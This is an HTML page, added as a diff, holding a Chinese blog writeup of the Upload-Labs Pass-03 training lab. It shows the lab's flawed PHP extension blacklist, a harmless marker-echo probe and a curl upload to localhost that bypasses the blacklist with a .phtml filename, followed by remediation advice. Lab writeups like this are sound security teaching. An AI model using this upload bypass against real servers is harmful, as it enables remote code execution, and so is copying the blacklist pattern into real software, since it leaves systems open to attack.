@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Upload-Labs Pass-03 黑名单遗漏 .phtml 解析扩展名 Writeup - gz2008的技术博客</title>
+  <style>
+* { box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 40px 20px;
+      color: #1e293b;
+      background: #f6f9fc;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
+      line-height: 1.8;
+    }
+    .container {
+      width: min(860px, 100%);
+      margin: 0 auto;
+      padding: 40px;
+      background: #fff;
+      border-radius: 18px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, .06);
+    }
+    .back-link { color: #2563eb; text-decoration: none; font-weight: 600; }
+    .back-link:hover { text-decoration: underline; }
+    h1 {
+      margin: 20px 0 10px;
+      padding-bottom: 15px;
+      border-bottom: 2px solid #eef2f6;
+      color: #0f172a;
+      font-size: clamp(1.8rem, 5vw, 2.3rem);
+      line-height: 1.35;
+    }
+    .tags { margin: 12px 0 26px; }
+    .tag {
+      display: inline-block;
+      margin: 0 8px 8px 0;
+      padding: 4px 12px;
+      color: #2563eb;
+      background: #eff6ff;
+      border-radius: 20px;
+      font-size: .85rem;
+      font-weight: 600;
+    }
+    h2 {
+      margin-top: 34px;
+      padding-left: 10px;
+      border-left: 4px solid #3b82f6;
+      color: #1e293b;
+      font-size: 1.35rem;
+    }
+    h3 { margin-top: 24px; color: #334155; font-size: 1.05rem; }
+    p, li { color: #475569; }
+    code {
+      padding: 2px 5px;
+      color: #be123c;
+      background: #f1f5f9;
+      border-radius: 4px;
+      font-family: Consolas, "SFMono-Regular", monospace;
+      overflow-wrap: anywhere;
+    }
+    pre {
+      padding: 16px;
+      color: #e2e8f0;
+      background: #172033;
+      border-radius: 8px;
+      overflow-x: auto;
+      font-family: Consolas, "SFMono-Regular", monospace;
+      font-size: .9rem;
+      line-height: 1.6;
+    }
+    pre code { padding: 0; color: inherit; background: none; }
+    figure { margin: 24px 0; }
+    figure img {
+      display: block;
+      width: 100%;
+      height: auto;
+      border: 1px solid #e2e8f0;
+      border-radius: 10px;
+      box-shadow: 0 6px 20px rgba(15, 23, 42, .07);
+    }
+    figcaption {
+      margin-top: 9px;
+      color: #64748b;
+      font-size: .9rem;
+      text-align: center;
+    }
+    .note, .success {
+      margin: 18px 0;
+      padding: 13px 16px;
+      border-left: 4px solid #f97316;
+      background: #fff7ed;
+      color: #9a3412;
+    }
+    .success {
+      border-left-color: #22c55e;
+      background: #f0fdf4;
+      color: #166534;
+    }
+    table { width: 100%; margin: 16px 0; border-collapse: collapse; }
+    th, td { padding: 9px 11px; border: 1px solid #e2e8f0; text-align: left; }
+    th { color: #1e3a8a; background: #eff6ff; }
+    @media (max-width: 640px) {
+      body { padding: 0; }
+      .container { padding: 24px 18px; border-radius: 0; }
+      table { display: block; overflow-x: auto; }
+    }
+  </style>
+</head>
+<body>
+  <main class="container">
+    <a class="back-link" href="index.html">← 返回 Upload-Labs 首页</a>
+    <h1>Upload-Labs Pass-03：黑名单遗漏 .phtml 解析扩展名</h1>
+    <div class="tags">
+      <span class="tag">Upload-Labs</span>
+      <span class="tag">Web</span>
+      <span class="tag">File Upload</span>
+      <span class="tag">PHP</span>
+      <span class="tag">Apache</span>
+    </div>
+<p>Pass-03 只把 <code>.asp</code>、<code>.aspx</code>、<code>.php</code>、<code>.jsp</code> 放进黑名单。程序会转小写、去尾随点、去除 <code>::$DATA</code> 并去空格，但最终仍把客户端扩展名拼到随机文件名后。Apache 的 PHP 模块同时处理 <code>.phtml</code>，因此黑名单遗漏可以直接转化为脚本执行。</p>
+
+    <div class="success"><strong>验证状态：</strong>本机 PHP 8.4.24 + Apache 2.4.68 下上传 <code>.phtml</code> 成功，访问后返回 <code>SAFE_MARKER_OK</code>。</div>
+
+    <h2>一、源码判断</h2>
+    <pre><code>$deny_ext = array('.asp','.aspx','.php','.jsp');
+$file_name = deldot(trim($_FILES['upload_file']['name']));
+$file_ext = strtolower(strrchr($file_name, '.'));
+$file_ext = trim(str_ireplace('::$DATA', '', $file_ext));
+
+if (!in_array($file_ext, $deny_ext)) {
+    $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
+    move_uploaded_file($_FILES['upload_file']['tmp_name'], $img_path);
+}</code></pre>
+    <p>这里处理的是“扩展名是否在四个字符串中”，不是“扩展名是否属于安全白名单”。<code>.phtml</code> 不在数组中，但 Apache 的 <code>libphp8.4.so</code> 配置会匹配 <code>\.ph(?:ar|p|tml)$</code>。</p>
+
+    <h2>二、复现请求</h2>
+    <p>探针只输出固定文本，不读取参数，也不执行系统命令：</p>
+    <pre><code>&lt;?php echo "SAFE_MARKER_OK"; ?&gt;</code></pre>
+    <p>通过 curl 把上传文件名覆盖成 <code>pass03_probe.phtml</code>：</p>
+    <pre><code>curl.exe -sS \
+  -F "upload_file=@safe-marker.txt;filename=pass03_probe.phtml;type=application/octet-stream" \
+  -F "submit=上传" \
+  "http://127.0.0.1:8081/Pass-03/index.php"</code></pre>
+    <p>响应给出了形如 <code>202611081138409469.phtml</code> 的随机文件名。访问该路径时，HTTP 200 响应正文为：</p>
+    <pre><code>SAFE_MARKER_OK</code></pre>
+
+    <h2>三、根因与影响</h2>
+    <p>根因是服务端使用可执行扩展名黑名单，而解释器实际接受的扩展名集合更大。随机文件名只能防止覆盖，不能阻止随机名最后的 <code>.phtml</code> 被 Apache 交给 PHP。只要上传目录可写且可访问，文件上传就能进一步形成代码执行。</p>
+
+    <h2>四、修复建议</h2>
+    <ul>
+      <li>使用安全扩展名白名单，并围绕最终保存名执行校验。</li>
+      <li>由服务端生成随机名和固定图片后缀，不接受客户端扩展名。</li>
+      <li>检查真实文件内容，并对图片重新解码、编码。</li>
+      <li>把上传目录移出 Web 根目录，或在 Web 服务器层关闭脚本执行。</li>
+    </ul>
+
+    <h2>五、复盘</h2>
+    <p>Pass-03 的关键不是某个参数异常，而是“应用认为不可执行的后缀”和“Apache 实际会解析的后缀”之间的集合差。验证时要分别记录上传成功、文件可访问和 PHP 实际执行三个阶段。</p>
+  </main>
+</body>
+</html>
